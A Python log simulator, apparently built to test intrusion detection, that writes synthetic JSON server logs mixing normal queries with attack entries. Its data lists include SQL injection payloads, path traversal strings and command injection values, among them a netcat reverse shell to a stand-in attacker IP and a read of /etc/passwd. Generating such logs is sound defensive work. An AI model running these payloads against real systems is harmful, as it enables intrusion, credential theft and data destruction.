import sys
import json
import random
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from .config import settings

if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

LEGIT_IPS = [f"10.0.{random.randint(1, 10)}.{random.randint(2, 250)}" for _ in range(15)]
ATTACK_IPS = ["203.0.113.10", "203.0.113.25", "203.0.113.42", "203.0.113.88"]
USERS = ["alice", "bob", "carol", "david", "marcos", "lucas", "admin_service"]

NORMAL_QUERIES = [
    "SELECT id, name, email FROM users WHERE status = 'active' LIMIT 10",
    "SELECT order_id, total, created_at FROM orders WHERE customer_id = 451",
    "SELECT product_id, stock_qty FROM inventory WHERE in_stock = 1",
    "UPDATE users SET last_login = NOW() WHERE id = 88",
    "INSERT INTO user_audit_log (user_id, action) VALUES (12, 'view_profile')",
    "SELECT count(*) FROM notifications WHERE read_at IS NULL"
]

SQLI_ATTACKS = [
    "SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND pass = '123'",
    "SELECT id, title FROM articles WHERE id = 10 UNION SELECT username, password FROM credentials --",
    "SELECT item FROM store WHERE id = 1; DROP TABLE customers; --",
    "SELECT id FROM products WHERE category = 'books' AND (SELECT 1 FROM (SELECT SLEEP(5))a)",
    "SELECT * FROM accounts WHERE id = -1 UNION ALL SELECT 1, column_name, 3 FROM information_schema.columns"
]

CMD_ATTACKS = [
    "ping -c 1 8.8.8.8; whoami",
    "test_file.png && cat /etc/passwd",
    "report.pdf; nc -e /bin/sh 203.0.113.99 4444"
]

LFI_ATTACKS = [
    "/view?file=../../../../etc/passwd",
    "/download?doc=..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"
]

class LogSimulator:
    """Simulador de tráfego realista contínuo com geração alternada de tráfego legítimo e ataques."""
    def __init__(self, log_path: str = "logs/server.log"):
        self.file_path = settings.base_dir / log_path
        self.file_path.parent.mkdir(parents=True, exist_ok=True)

    def generate_single_log(self, force_attack: Optional[bool] = None, attack_type: str = "random") -> dict:
        if force_attack is True:
            is_attack = True
        elif force_attack is False:
            is_attack = False
        else:
            is_attack = random.random() < 0.25

        now = datetime.now(timezone.utc).isoformat()

        if not is_attack:
            ip = random.choice(LEGIT_IPS)
            user = random.choice(USERS)
            if random.random() < 0.2:
                # Login legítimo bem-sucedido
                return {
                    "timestamp": now,
                    "source_ip": ip,
                    "user": user,
                    "action_type": "AUTH_LOGIN",
                    "payload": f"User {user} authenticated successfully",
                    "status_code": 200
                }
            else:
                return {
                    "timestamp": now,
                    "source_ip": ip,
                    "user": user,
                    "action_type": "QUERY",
                    "payload": random.choice(NORMAL_QUERIES),
                    "status_code": 200
                }

        # Tráfego malicioso
        ip = random.choice(ATTACK_IPS)
        types = ["sqli", "cmd_injection", "lfi", "brute_force", "exfiltration"]
        selected_type = attack_type if attack_type in types else random.choice(types)

        if selected_type == "sqli":
            return {
                "timestamp": now,
                "source_ip": ip,
                "user": "anonymous",
                "action_type": "QUERY",
                "payload": random.choice(SQLI_ATTACKS),
                "status_code": 500
            }
        elif selected_type == "cmd_injection":
            return {
                "timestamp": now,
                "source_ip": ip,
                "user": "guest",
                "action_type": "QUERY",
                "payload": random.choice(CMD_ATTACKS),
                "status_code": 500
            }
        elif selected_type == "lfi":
            return {
                "timestamp": now,
                "source_ip": ip,
                "user": "anonymous",
                "action_type": "HTTP_REQUEST",
                "payload": random.choice(LFI_ATTACKS),
                "status_code": 403
            }
        elif selected_type == "brute_force":
            return {
                "timestamp": now,
                "source_ip": ip,
                "user": "admin",
                "action_type": "AUTH_LOGIN",
                "payload": f"Login failed: invalid password for user admin (attempt {random.randint(1, 10)})",
                "status_code": 401
            }
        else:  # exfiltration
            return {
                "timestamp": now,
                "source_ip": ip,
                "user": "malicious_user",
                "action_type": "QUERY",
                "payload": "SELECT * FROM financial_records_sensitive LIMIT 10000",
                "status_code": 200
            }

    def run(self, interval: float = 1.0, count: int = 0):
        """Executa a emissão de logs para o arquivo especificado."""
        print(f"🚀 [Log Simulator] Iniciando geração de logs em: {self.file_path}")
        print("Pressione Ctrl+C para encerrar.\n")
        generated = 0
        try:
            while True:
                log_entry = self.generate_single_log()
                with open(self.file_path, "a", encoding="utf-8") as f:
                    f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")

                generated += 1
                if count and generated >= count:
                    break
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n🛑 [Log Simulator] Finalizado pelo usuário.")
